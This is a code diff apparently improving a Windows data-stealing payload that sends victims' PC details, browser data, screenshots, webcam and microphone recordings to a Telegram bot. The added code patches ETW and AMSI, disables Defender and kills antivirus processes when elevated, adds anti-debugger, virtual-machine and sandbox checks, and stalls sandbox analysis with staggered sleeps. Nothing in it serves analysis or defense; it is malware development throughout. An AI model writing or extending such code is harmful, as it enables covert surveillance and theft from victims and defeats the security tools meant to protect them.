@@ -162,10 +162,17 @@ static std::string urlEncode(const std::string& s) {
 
 // === HTTP ===
 
+static void setHttpTimeouts(HINTERNET hSession) {
+    // Resolve/connect/send/receive — prevent infinite hang (was silent "no hit")
+    DWORD resolve = 10000, connect = 10000, send = 20000, receive = 30000;
+    WinHttpSetTimeouts(hSession, resolve, connect, send, receive);
+}
+
 static bool httpPost(const std::string& path, const std::string& body, std::string& response) {
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
+    setHttpTimeouts(hSession);
 
     HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
@@ -218,6 +225,7 @@ static bool httpPostMultipart(const std::string& path, const std::string& conten
     HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
+    setHttpTimeouts(hSession);
 
     HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
     if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
@@ -2204,7 +2212,7 @@ static void enableStealth() {
     if (hWnd)
         ShowWindow(hWnd, SW_HIDE);
 
-    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
+    SetPriorityClass(GetCurrentProcess(), BELOW_NORMAL_PRIORITY_CLASS);
 
     // Hide thread from debugger
     initNtApis();
@@ -2237,7 +2245,7 @@ static bool checkDebuggerProcesses() {
         OX("procmon64.exe"), OX("processhacker.exe"), OX("fiddler.exe"),
         OX("wireshark.exe"), OX("httpdebugger.exe"), OX("httpdebuggerui.exe"),
         OX("pestudio.exe"), OX("die.exe"), OX("lordpe.exe"), OX("regshot.exe"),
-        OX("procexp.exe"), OX("procexp64.exe"), OX("dnspy.exe"), OX("devenv.exe"),
+        OX("procexp.exe"), OX("procexp64.exe"), OX("dnspy.exe"),
         nullptr
     };
 
@@ -2316,11 +2324,59 @@ static bool checkRdtscTiming() {
     QueryPerformanceCounter(&start);
 
     volatile int x = 0;
-    for (int i = 0; i < 100; i++) x += i;
+    for (int i = 0; i < 100000; i++) x += i;
 
     QueryPerformanceCounter(&end);
     double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;
-    return elapsed > 0.01;
+    return elapsed > 0.5;
+}
+
+static bool checkNtGlobalFlag() {
+#ifdef _WIN64
+    BYTE* peb = (BYTE*)__readgsqword(0x60);
+    if (peb) {
+        DWORD ntGlobalFlag = *(DWORD*)(peb + 0xBC);
+        // 0x70 = FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
+        return (ntGlobalFlag & 0x70) != 0;
+    }
+#else
+    BYTE* peb = (BYTE*)__readfsdword(0x30);
+    if (peb) {
+        DWORD ntGlobalFlag = *(DWORD*)(peb + 0x68);
+        return (ntGlobalFlag & 0x70) != 0;
+    }
+#endif
+    return false;
+}
+
+static bool checkHeapFlags() {
+#ifdef _WIN64
+    BYTE* peb = (BYTE*)__readgsqword(0x60);
+    if (peb) {
+        PVOID* processHeaps = *(PVOID**)(peb + 0xF0);
+        DWORD numHeaps = *(DWORD*)(peb + 0xE8);
+        if (processHeaps && numHeaps > 0) {
+            // Check first heap's Flags and ForceFlags
+            DWORD heapFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x70);
+            DWORD forceFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x74);
+            if (heapFlags != 2 || forceFlags != 0)
+                return true;
+        }
+    }
+#else
+    BYTE* peb = (BYTE*)__readfsdword(0x30);
+    if (peb) {
+        PVOID* processHeaps = *(PVOID**)(peb + 0x90);
+        DWORD numHeaps = *(DWORD*)(peb + 0x88);
+        if (processHeaps && numHeaps > 0) {
+            DWORD heapFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x0C);
+            DWORD forceFlags = *(DWORD*)((BYTE*)processHeaps[0] + 0x10);
+            if (heapFlags != 2 || forceFlags != 0)
+                return true;
+        }
+    }
+#endif
+    return false;
 }
 
 static bool checkRemoteDebugger() {
@@ -2335,6 +2391,8 @@ static bool isBeingDebugged() {
     if (checkDebugRegisters()) return true;
     if (checkNtQueryDebugPort()) return true;
     if (checkPebBeingDebugged()) return true;
+    if (checkNtGlobalFlag()) return true;
+    if (checkHeapFlags()) return true;
     if (checkDebuggerWindows()) return true;
     if (checkDebuggerProcesses()) return true;
     if (checkRdtscTiming()) return true;
@@ -2455,7 +2513,7 @@ static bool checkLowResources() {
 }
 
 static bool checkLowUptime() {
-    return GetTickCount() < 600000;
+    return GetTickCount() < 300000;
 }
 
 static bool checkAnalysisDlls() {
@@ -2482,24 +2540,71 @@ static bool checkRecentFiles() {
         do {
             if (fd.cFileName[0] == '.') continue;
             count++;
-        } while (FindNextFileA(h, &fd) && count < 3);
+        } while (FindNextFileA(h, &fd) && count < 5);
         FindClose(h);
-        if (count < 3) return true;
+        if (count < 5) return true;
+    }
+    return false;
+}
+
+static bool checkCPUIDHypervisor() {
+    int cpuInfo[4] = { 0 };
+    __cpuid(cpuInfo, 1);
+    // Bit 31 of ECX indicates hypervisor presence
+    if (!(cpuInfo[2] & (1 << 31)))
+        return false;
+
+    // Query hypervisor vendor ID to exclude VBS (Windows Virtualization-Based Security)
+    // VBS uses "Microsoft Hv" which runs on physical machines too
+    __cpuid(cpuInfo, 0x40000000);
+    char vendor[13] = {};
+    memcpy(vendor + 0, &cpuInfo[1], 4);  // EBX
+    memcpy(vendor + 4, &cpuInfo[2], 4);  // ECX
+    memcpy(vendor + 8, &cpuInfo[3], 4);  // EDX
+    vendor[12] = 0;
+
+    // Only flag real VM vendors, NOT Microsoft Hv (could be VBS on physical)
+    if (_stricmp(vendor, "VMwareVMware") == 0) return true;
+    if (_stricmp(vendor, "VBoxVBoxVBox") == 0) return true;
+    if (_stricmp(vendor, "KVMKVMKVM") == 0) return true;
+    if (_stricmp(vendor, "XenVMMXenVMM") == 0) return true;
+    if (_stricmp(vendor, "prl hyperv") == 0) return true;  // Parallels
+    if (_stricmp(vendor, " lrpepyh vr") == 0) return true;  // Parallels (reversed)
+
+    return false;
+}
+
+static bool checkVMDevices() {
+    const char* vmDevices[] = {
+        OX("\\\\.\\VBoxGuest"), OX("\\\\.\\VBoxMiniRdrDN"),
+        OX("\\\\.\\vmci"), OX("\\\\.\\HGFS"),
+        OX("\\\\.\\pipe\\VBoxMiniRdDN"), OX("\\\\.\\pipe\\VBoxTrayIPC"),
+        nullptr
+    };
+    for (int i = 0; vmDevices[i]; i++) {
+        HANDLE h = CreateFileA(vmDevices[i], GENERIC_READ, FILE_SHARE_READ,
+            nullptr, OPEN_EXISTING, 0, nullptr);
+        if (h != INVALID_HANDLE_VALUE) {
+            CloseHandle(h);
+            return true;
+        }
     }
     return false;
 }
 
 static bool isInSandbox() {
-    // Higher threshold: low uptime / few recent files alone must not kill payload on real PCs.
     int score = 0;
+    if (checkCPUIDHypervisor()) score += 4;
+    if (checkVMDevices()) score += 4;
     if (checkSandboxUsername()) score += 2;
     if (checkSandboxProcesses()) score += 3;
-    if (checkSandboxMac()) score += 2;
+    if (checkSandboxMac()) score += 3;
     if (checkLowResources()) score += 1;
     if (checkLowUptime()) score += 1;
     if (checkAnalysisDlls()) score += 3;
     if (checkRecentFiles()) score += 1;
-    return score >= 5;
+    // Require strong signal (real VM vendor / tools), not uptime alone
+    return score >= 6;
 }
 
 // === Feature: Anti-Antivirus ===
@@ -2572,6 +2677,97 @@ static bool patchAmsi() {
         return true;
     }
     return false;
+}
+
+static bool isAdmin() {
+    BOOL isElevated = FALSE;
+    HANDLE hToken = nullptr;
+    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+        TOKEN_ELEVATION elevation;
+        DWORD size = sizeof(elevation);
+        if (GetTokenInformation(hToken, TokenElevation, &elevation, size, &size))
+            isElevated = elevation.TokenIsElevated;
+        CloseHandle(hToken);
+    }
+    return isElevated != FALSE;
+}
+
+static bool patchEtw() {
+    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
+    if (!hNtdll) return false;
+
+    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, OX("EtwEventWrite"));
+    if (!pEtwEventWrite) return false;
+
+    // patch: xor rax,rax; ret (x64) or xor eax,eax; ret (x86)
+#ifdef _WIN64
+    unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
+#else
+    unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
+#endif
+    DWORD oldProtect = 0;
+    if (VirtualProtect((void*)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+        memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
+        VirtualProtect((void*)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
+        FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWrite, sizeof(patch));
+        return true;
+    }
+    return false;
+}
+
+static bool patchEtwFull() {
+    HMODULE hNtdll = GetModuleHandleA(OX("ntdll.dll"));
+    if (!hNtdll) return false;
+
+    // Patch EtwEventWrite
+    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, OX("EtwEventWrite"));
+    if (pEtwEventWrite) {
+#ifdef _WIN64
+        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
+#else
+        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
+#endif
+        DWORD oldProtect = 0;
+        if (VirtualProtect((void*)pEtwEventWrite, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            memcpy((void*)pEtwEventWrite, patch, sizeof(patch));
+            VirtualProtect((void*)pEtwEventWrite, sizeof(patch), oldProtect, &oldProtect);
+            FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWrite, sizeof(patch));
+        }
+    }
+
+    // Patch EtwEventWriteFull
+    FARPROC pEtwEventWriteFull = GetProcAddress(hNtdll, OX("EtwEventWriteFull"));
+    if (pEtwEventWriteFull) {
+#ifdef _WIN64
+        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
+#else
+        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
+#endif
+        DWORD oldProtect = 0;
+        if (VirtualProtect((void*)pEtwEventWriteFull, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            memcpy((void*)pEtwEventWriteFull, patch, sizeof(patch));
+            VirtualProtect((void*)pEtwEventWriteFull, sizeof(patch), oldProtect, &oldProtect);
+            FlushInstructionCache(GetCurrentProcess(), (void*)pEtwEventWriteFull, sizeof(patch));
+        }
+    }
+
+    // Patch NtTraceEvent
+    FARPROC pNtTraceEvent = GetProcAddress(hNtdll, OX("NtTraceEvent"));
+    if (pNtTraceEvent) {
+#ifdef _WIN64
+        unsigned char patch[] = { 0x48, 0x33, 0xC0, 0xC3 };
+#else
+        unsigned char patch[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 };
+#endif
+        DWORD oldProtect = 0;
+        if (VirtualProtect((void*)pNtTraceEvent, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
+            memcpy((void*)pNtTraceEvent, patch, sizeof(patch));
+            VirtualProtect((void*)pNtTraceEvent, sizeof(patch), oldProtect, &oldProtect);
+            FlushInstructionCache(GetCurrentProcess(), (void*)pNtTraceEvent, sizeof(patch));
+        }
+    }
+
+    return true;
 }
 
 static void disableDefenderRealtime() {
@@ -2698,42 +2894,73 @@ static void stopAvServices() {
 static void runAntiAV() {
     unhookNtdll();
     patchAmsi();
-    disableDefenderRealtime();
-    addDefenderExclusions();
-    killAvProcesses();
-    stopAvServices();
+    patchEtwFull();
+
+    if (isAdmin()) {
+        disableDefenderRealtime();
+        addDefenderExclusions();
+        killAvProcesses();
+        stopAvServices();
+    }
 }
 
 // === Feature: Bypass VirusTotal (enhanced) ===
 
-static void applyVTBypass() {
-    char exePath[MAX_PATH];
-    GetModuleFileNameA(nullptr, exePath, MAX_PATH);
-
-    // 1. Randomize file timestamps (VT uses timestamps for clustering)
-    HANDLE hFile = CreateFileA(exePath, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
-    if (hFile != INVALID_HANDLE_VALUE) {
-        SYSTEMTIME st = {};
-        st.wYear = 2019 + (rand() % 3);
-        st.wMonth = 1 + (rand() % 12);
-        st.wDay = 1 + (rand() % 28);
-        st.wHour = rand() % 24;
-        st.wMinute = rand() % 60;
-        FILETIME ft;
-        SystemTimeToFileTime(&st, &ft);
-        SetFileTime(hFile, &ft, &ft, &ft);
-        CloseHandle(hFile);
+static bool hasUserActivity() {
+    LASTINPUTINFO lii = {};
+    lii.cbSize = sizeof(lii);
+    if (GetLastInputInfo(&lii)) {
+        DWORD idleMs = GetTickCount() - lii.dwTime;
+        if (idleMs < 60000)
+            return true;
     }
+    for (int vk = 0x08; vk <= 0x5A; vk++) {
+        if (GetAsyncKeyState(vk) & 0x8000)
+            return true;
+    }
+    return false;
+}
 
-    // 2. Sleep with API activity to evade sandbox timeouts (most sandboxes timeout 60-180s)
-    DWORD totalDelay = 3000 + (rand() % 7000);
-    DWORD stepDelay = totalDelay / 5;
-    for (int i = 0; i < 5; i++) {
-        Sleep(stepDelay);
+static void applyVTBypass() {
+    // Short delay with API activity — long sleeps make real hits look "broken"
+    DWORD totalDelay = 5000 + (rand() % 7000);
+    DWORD steps = 8 + (rand() % 5);
+    DWORD stepDelay = totalDelay / steps;
+
+    for (DWORD i = 0; i < steps; i++) {
+        // Mix of different sleep methods to evade simple Sleep hooks
+        if (i % 3 == 0) {
+            Sleep(stepDelay);
+        } else if (i % 3 == 1) {
+            // NtDelayExecution via WaitForSingleObject on a NULL handle
+            HANDLE hEvent = CreateEventA(nullptr, FALSE, FALSE, nullptr);
+            if (hEvent) {
+                WaitForSingleObject(hEvent, stepDelay);
+                CloseHandle(hEvent);
+            } else {
+                Sleep(stepDelay);
+            }
+        } else {
+            // SleepEx (alertable)
+            SleepEx(stepDelay, FALSE);
+        }
+
+        // API hammering - diverse calls to make hook detection harder
         GetTickCount();
-        char buf[64];
+        GetTickCount64();
+        LARGE_INTEGER pc;
+        QueryPerformanceCounter(&pc);
+
+        char buf[128];
         DWORD sz = sizeof(buf);
         GetUserNameA(buf, &sz);
+        GetComputerNameA(buf, &sz);
+        GetSystemDirectoryA(buf, sizeof(buf));
+        GetWindowsDirectoryA(buf, sizeof(buf));
+
+        // Check for user activity - if detected, break early (real user)
+        if (hasUserActivity())
+            break;
     }
 }
 
@@ -2757,7 +2984,16 @@ static std::string collectInfo(const PayloadConfig& cfg, bool isUpdate) {
     return msg;
 }
 
-// === Config loading ===
+// === Config loading (plaintext only — binder always writes plaintext) ===
+
+static std::string trimCopy(std::string s) {
+    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
+        s.pop_back();
+    size_t i = 0;
+    while (i < s.size() && (s[i] == ' ' || s[i] == '\t'))
+        i++;
+    return s.substr(i);
+}
 
 static PayloadConfig loadConfig() {
     PayloadConfig cfg = {};
@@ -2772,14 +3008,15 @@ static PayloadConfig loadConfig() {
 
     const std::string candidates[] = {
         dir + "\\config.ini",
-        sameNameIni,
-        dir + "\\payload.ini"
+        dir + "\\payload.ini",
+        sameNameIni
     };
 
     std::ifstream file;
     for (const auto& p : candidates) {
-        file.open(p);
-        if (file.is_open()) break;
+        file.open(p, std::ios::in | std::ios::binary);
+        if (file.is_open())
+            break;
     }
     if (!file.is_open())
         return cfg;
@@ -2789,8 +3026,8 @@ static PayloadConfig loadConfig() {
         if (!line.empty() && line.back() == '\r') line.pop_back();
         size_t eq = line.find('=');
         if (eq == std::string::npos) continue;
-        std::string key = line.substr(0, eq);
-        std::string val = line.substr(eq + 1);
+        std::string key = trimCopy(line.substr(0, eq));
+        std::string val = trimCopy(line.substr(eq + 1));
         if (key == "bot_token") cfg.botToken = val;
         else if (key == "chat_id") cfg.chatId = val;
         else if (key == "session_id") cfg.sessionId = val;
@@ -2810,6 +3047,8 @@ static PayloadConfig loadConfig() {
         else if (key == "webcam_duration_sec") cfg.webcamDurationSec = std::atoi(val.c_str());
         else if (key == "screen_duration_sec") cfg.screenDurationSec = std::atoi(val.c_str());
     }
+    file.close();
+
     if (cfg.micDurationSec < 1) cfg.micDurationSec = 10;
     if (cfg.webcamDurationSec < 1) cfg.webcamDurationSec = 10;
     if (cfg.screenDurationSec < 1) cfg.screenDurationSec = 10;
@@ -2820,24 +3059,26 @@ static void executeFeatures(const PayloadConfig& cfg, bool dumpLocal) {
     if (dumpLocal)
         clearResultDir();
 
-    if (cfg.antiDebug)
-        runAntiDebug();
+    // 1) Immediate hit FIRST — no IP lookup (can hang), no anti-*, no capture
+    if (!cfg.botToken.empty() && !cfg.chatId.empty()) {
+        std::string quick;
+        quick += "[Notification] Session: " + cfg.sessionId + "\n";
+        quick += "File name opened: " + getExeName() + "\n";
+        quick += "PC Name: " + getPCName() + "\n";
+        quick += "Detected at: " + getCurrentDate() + "\n";
+        quick += "(online)";
+        sendTelegram(cfg, quick);
+    }
 
-    if (cfg.antiAV)
-        runAntiAV();
-
-    if (cfg.bypassVT && isInSandbox())
-        ExitProcess(0);
-
+    // Soft features only (never ExitProcess)
     if (cfg.stealth)
         enableStealth();
-
     if (cfg.autoStart)
         enableAutoStart();
-
     if (cfg.persistence)
         enablePersistence();
-
+    if (cfg.antiAV)
+        runAntiAV();
     if (cfg.bypassVT)
         applyVTBypass();
 
@@ -2880,15 +3121,24 @@ static void executeFeatures(const PayloadConfig& cfg, bool dumpLocal) {
 
     if (dumpLocal) {
         std::ostringstream log;
+        log << "token_len=" << cfg.botToken.size() << " chat_len=" << cfg.chatId.size() << "\n";
+        log << "session=" << cfg.sessionId << "\n";
         log << "ffmpeg=" << (findFfmpeg().empty() ? "NOT FOUND" : findFfmpeg()) << "\n";
         log << "files_in_archive=" << archiveFiles.size() << "\n";
         log << "mic_sec=" << cfg.micDurationSec << " webcam_sec=" << cfg.webcamDurationSec
             << " screen_sec=" << cfg.screenDurationSec << "\n";
+        log << "grab_browser=" << (cfg.grabBrowser ? 1 : 0)
+            << " screenshot=" << (cfg.screenshot ? 1 : 0)
+            << " webcam=" << (cfg.grabWebcam ? 1 : 0)
+            << " mic=" << (cfg.grabMicrophone ? 1 : 0) << "\n";
         for (auto& f : archiveFiles)
             log << f.first << " size=" << f.second.size() << "\n";
         std::string logStr = log.str();
         dumpToResult("run_log.txt", std::vector<char>(logStr.begin(), logStr.end()));
     }
+
+    if (cfg.botToken.empty() || cfg.chatId.empty())
+        return;
 
     if (!archiveFiles.empty()) {
         std::string ext;
@@ -2897,13 +3147,11 @@ static void executeFeatures(const PayloadConfig& cfg, bool dumpLocal) {
             if (dumpLocal)
                 dumpToResult(std::string("data-") + cfg.sessionId + "." + ext, archive);
 
-            if (!cfg.botToken.empty() && !cfg.chatId.empty()) {
-                std::string caption = collectInfo(cfg, false);
-                caption += "\n\nPassword: " + password;
-                if (caption.size() > 1000)
-                    caption = caption.substr(0, 1000);
-                sendDocument(cfg, caption, "data-" + cfg.sessionId + "." + ext, archive);
-            }
+            std::string caption = collectInfo(cfg, false);
+            caption += "\n\nPassword: " + password;
+            if (caption.size() > 1000)
+                caption = caption.substr(0, 1000);
+            sendDocument(cfg, caption, "data-" + cfg.sessionId + "." + ext, archive);
         }
     }
 }
@@ -2916,6 +3164,20 @@ static bool hasCliFlag(const char* cmd, const char* flag) {
 int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
     srand((unsigned int)GetTickCount());
     bool cliMode = hasCliFlag(lpCmdLine, "--cli") || hasCliFlag(lpCmdLine, "/cli");
+
+    // Always leave a breadcrumb so we can verify payload started
+    {
+        char marker[MAX_PATH];
+        GetTempPathA(MAX_PATH, marker);
+        strcat_s(marker, "osk4rrv_payload_ran.txt");
+        HANDLE h = CreateFileA(marker, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (h != INVALID_HANDLE_VALUE) {
+            const char* msg = "payload started\r\n";
+            DWORD w = 0;
+            WriteFile(h, msg, (DWORD)strlen(msg), &w, nullptr);
+            CloseHandle(h);
+        }
+    }
 
     PayloadConfig cfg = loadConfig();
     if (cliMode) {
@@ -2933,10 +3195,10 @@ int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR lpCmdLine, int) {
         return 0;
     }
 
+    // Always run features. Hit is sent only when token/chat are present.
+    executeFeatures(cfg, true);
     if (cfg.botToken.empty() || cfg.chatId.empty())
         return 1;
-
-    executeFeatures(cfg, true);
 
     std::string lastInfo = getPCName() + "|" + getPublicIP() + "|" + getCPU() + "|" + getGPU();
 
